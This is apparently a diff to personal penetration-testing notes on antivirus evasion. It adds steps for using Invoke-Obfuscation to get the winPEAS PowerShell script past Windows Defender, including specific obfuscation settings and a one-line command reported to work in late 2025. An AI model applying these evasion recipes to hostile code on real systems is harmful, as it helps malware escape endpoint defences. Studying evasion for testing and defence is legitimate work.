@@ -23,6 +23,23 @@ pagetitle: Antivirus Evasion
 
 ## Bypassing Detection
 
+**Powershell scripts**
+- Defender seems to suck at blocking powershell scripts it hasn't seen before
+- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) seems to be a GODLIKE tool for performing any obfuscation desired
+  - Kali already has `pwsh` for powershell, so we can create the payloads there
+  - `git clone https://github.com/danielbohannon/Invoke-Obfuscation.git`, `Import-Module ./Invoke-Obfuscation.psd1`, and then `Invoke-Obfuscation`
+- We get dropped into an interactive shell, where we can load a script and then apply changes to it
+- For example, let's use winpeas
+  - Start by specifying the script with `SET SCRIPTPATH https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1`
+    - Can also pass a local path
+  - We can then obfuscate all strings with `TOKEN`, then `STRING`, then `1` or `2` depending on what's desired
+- As of December 2025, I could get winpeas past defender with:
+  - `Token\String\2`, and then another `Token\String\2` (string reordering)
+  - `Token\Comment\1` (remove comments)
+  - `Token\Command\2` (splatting and concatenating commands - `New-Object` becomes `&('Ne'+'w-Ob'+'ject')`)
+  - `Token\Variable\1` (apply random case, backticks, and curly braces to variables)
+  - Oneshot: `Invoke-Obfuscation -ScriptPath 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1' -Command 'Token\String\2,Token\String\2,Token\Comment\1,Token\Command\2,Token\Variable\1' -Quiet > winpeas_ob.ps1`
+  
 **On-disk Evasion**
 - Obfuscators can be marginally effective
 - _Crypter_ cryptographically alters code and only decrypts in memory
